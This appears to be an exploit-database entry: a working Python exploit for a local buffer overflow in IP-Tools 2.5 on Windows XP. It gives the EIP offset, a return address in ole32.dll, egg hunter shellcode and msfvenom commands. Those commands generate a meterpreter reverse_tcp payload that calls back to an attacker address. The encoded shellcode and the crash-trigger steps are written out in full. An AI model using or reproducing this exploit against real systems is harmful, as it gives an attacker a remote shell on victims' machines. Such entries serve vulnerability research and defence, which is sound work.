# Exploit Title: IP-Tools 2.5 - Local Buffer Overflow (EggHunter) - Exploit
# Date: 2019-03-01
# Exploit Author: Uday Mittal
# Vendor Homepage: https://ip-tools.software.informer.com/2.5/
# Software Link: https://ip-tools.software.informer.com/download/
# Version : 2.5
# Contact: https://twitter.com/yaksas443
# Tested on: Microsoft Windows XP SP3
# original PoC: https://www.exploit-db.com/exploits/46334


# EIP Offset: 264
# 0x77516f60 : call edi | asciiprint,ascii {PAGE_EXECUTE_READ} [ole32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.6435 (C:\WINDOWS\system32\ole32.dll)
# badchars: everything except alphanumeric and printable special characters
# Egg hunter shellcode: "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x59\x43\x53\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# To encode egg hunter shellcode save it in a file iptools.bin and then issue the following command:
# msfvenom -p generic/custom PAYLOADFILE=iptools.bin -e x86/alpha_mixed -f python BufferRegister=EDI
# Payload shellcode command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=4444 -e x86/alpha_mixed -f python BufferRegister=EDI -v scode

# Proof of Concept:
# 1.- Run the python script "iptoolsPOC.py", it will create a new file "evil.txt"
# 2.- Copy the content of the new file 'evil.txt' to clipboard
# 3.- Open IP_TOOLS.EXE
# 4.- Go to Options > Host Options > Logging 
# 5.- Paste clipboard contents in 'Log to the file' field
# 6.- Press OK 
# 7.- Application will crash and it will trigger the exploit


filename = "evil.txt"

buf =  ""
buf += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
buf += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
buf += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
buf += "\x63\x56\x4b\x31\x6a\x6a\x4b\x4f\x76\x6f\x52\x62\x36"
buf += "\x32\x62\x4a\x47\x72\x66\x38\x7a\x6d\x74\x6e\x77\x4c"
buf += "\x46\x65\x70\x5a\x42\x54\x58\x6f\x38\x38\x71\x49\x51"
buf += "\x53\x73\x63\x71\x53\x4e\x6b\x6a\x5a\x4e\x4f\x64\x35"
buf += "\x38\x6a\x4c\x6f\x44\x35\x49\x77\x79\x6f\x4d\x37\x41"
buf += "\x41"


scode =  ""
scode += "\x57\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
scode += "\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30"
scode += "\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42"
scode += "\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
scode += "\x59\x6c\x79\x78\x4b\x32\x53\x30\x57\x70\x55\x50\x33"
scode += "\x50\x4b\x39\x59\x75\x70\x31\x4f\x30\x50\x64\x6c\x4b"
scode += "\x30\x50\x30\x30\x6e\x6b\x71\x42\x46\x6c\x6c\x4b\x56"
scode += "\x32\x36\x74\x4c\x4b\x52\x52\x47\x58\x66\x6f\x6c\x77"
scode += "\x71\x5a\x55\x76\x75\x61\x39\x6f\x4c\x6c\x45\x6c\x43"
scode += "\x51\x73\x4c\x67\x72\x64\x6c\x57\x50\x6f\x31\x7a\x6f"
scode += "\x54\x4d\x46\x61\x49\x57\x7a\x42\x4b\x42\x46\x32\x66"
scode += "\x37\x4e\x6b\x72\x72\x36\x70\x6c\x4b\x42\x6a\x65\x6c"
scode += "\x6c\x4b\x72\x6c\x36\x71\x64\x38\x49\x73\x72\x68\x57"
scode += "\x71\x6b\x61\x52\x71\x6c\x4b\x73\x69\x47\x50\x46\x61"
scode += "\x68\x53\x6c\x4b\x30\x49\x42\x38\x79\x73\x65\x6a\x77"
scode += "\x39\x6e\x6b\x77\x44\x6e\x6b\x37\x71\x59\x46\x46\x51"
scode += "\x4b\x4f\x6e\x4c\x69\x51\x6a\x6f\x76\x6d\x76\x61\x38"
scode += "\x47\x57\x48\x6b\x50\x34\x35\x58\x76\x65\x53\x33\x4d"
scode += "\x79\x68\x35\x6b\x73\x4d\x74\x64\x43\x45\x4a\x44\x50"
scode += "\x58\x4e\x6b\x71\x48\x36\x44\x66\x61\x49\x43\x31\x76"
scode += "\x4c\x4b\x44\x4c\x70\x4b\x6e\x6b\x62\x78\x47\x6c\x75"
scode += "\x51\x58\x53\x4e\x6b\x33\x34\x4e\x6b\x53\x31\x38\x50"
scode += "\x4b\x39\x61\x54\x34\x64\x46\x44\x33\x6b\x33\x6b\x75"
scode += "\x31\x71\x49\x73\x6a\x72\x71\x6b\x4f\x49\x70\x53\x6f"
scode += "\x43\x6f\x63\x6a\x4c\x4b\x67\x62\x6a\x4b\x6e\x6d\x51"
scode += "\x4d\x31\x78\x56\x53\x55\x62\x77\x70\x37\x70\x72\x48"
scode += "\x50\x77\x53\x43\x37\x42\x71\x4f\x71\x44\x61\x78\x32"
scode += "\x6c\x62\x57\x66\x46\x57\x77\x4d\x59\x6a\x48\x69\x6f"
scode += "\x78\x50\x4c\x78\x6c\x50\x43\x31\x45\x50\x63\x30\x35"
scode += "\x79\x58\x44\x72\x74\x52\x70\x73\x58\x47\x59\x4f\x70"
scode += "\x72\x4b\x55\x50\x39\x6f\x6a\x75\x61\x7a\x64\x4a\x52"
scode += "\x48\x6b\x70\x59\x38\x75\x51\x53\x37\x72\x48\x76\x62"
scode += "\x57\x70\x56\x71\x53\x6c\x4e\x69\x79\x76\x70\x50\x72"
scode += "\x70\x56\x30\x50\x50\x57\x30\x76\x30\x77\x30\x76\x30"
scode += "\x51\x78\x7a\x4a\x36\x6f\x49\x4f\x69\x70\x59\x6f\x58"
scode += "\x55\x6e\x77\x51\x7a\x62\x30\x66\x36\x36\x37\x50\x68"
scode += "\x7a\x39\x49\x35\x34\x34\x65\x31\x4b\x4f\x6a\x75\x4f"
scode += "\x75\x6b\x70\x42\x54\x64\x4a\x59\x6f\x52\x6e\x56\x68"
scode += "\x71\x65\x58\x6c\x69\x78\x72\x47\x73\x30\x53\x30\x47"
scode += "\x70\x71\x7a\x63\x30\x30\x6a\x45\x54\x73\x66\x70\x57"
scode += "\x70\x68\x46\x62\x48\x59\x68\x48\x43\x6f\x79\x6f\x48"
scode += "\x55\x6e\x63\x58\x78\x33\x30\x31\x6e\x34\x76\x6e\x6b"
scode += "\x55\x66\x62\x4a\x33\x70\x65\x38\x67\x70\x56\x70\x37"
scode += "\x70\x53\x30\x43\x66\x72\x4a\x53\x30\x30\x68\x31\x48"
scode += "\x69\x34\x73\x63\x79\x75\x6b\x4f\x4a\x75\x4f\x63\x76"
scode += "\x33\x42\x4a\x43\x30\x66\x36\x52\x73\x36\x37\x51\x78"
scode += "\x77\x72\x78\x59\x58\x48\x53\x6f\x69\x6f\x5a\x75\x4f"
scode += "\x73\x6a\x58\x65\x50\x53\x4d\x36\x48\x46\x38\x53\x58"
scode += "\x63\x30\x37\x30\x33\x30\x73\x30\x73\x5a\x65\x50\x66"
scode += "\x30\x75\x38\x44\x4b\x64\x6f\x66\x6f\x50\x30\x39\x6f"
scode += "\x39\x45\x30\x57\x75\x38\x63\x45\x42\x4e\x32\x6d\x55"
scode += "\x31\x4b\x4f\x6a\x75\x31\x4e\x61\x4e\x4b\x4f\x34\x4c"
scode += "\x65\x74\x46\x6f\x4d\x55\x72\x50\x79\x6f\x79\x6f\x79"
scode += "\x6f\x49\x79\x4d\x4b\x59\x6f\x39\x6f\x39\x6f\x53\x31"
scode += "\x48\x43\x44\x69\x5a\x66\x34\x35\x6b\x71\x38\x43\x6d"
scode += "\x6b\x38\x70\x38\x35\x39\x32\x66\x36\x61\x7a\x57\x70"
scode += "\x76\x33\x6b\x4f\x69\x45\x41\x41"



evilhunter = buf +"A" * 146 + "\x60\x6f\x51\x77" + "BBBB" + "\x1e\x41\x41\x41" + "YCSCYCSC" + scode + "D"*100

file = open(filename,'w')
file.write(evilhunter)
file.close()
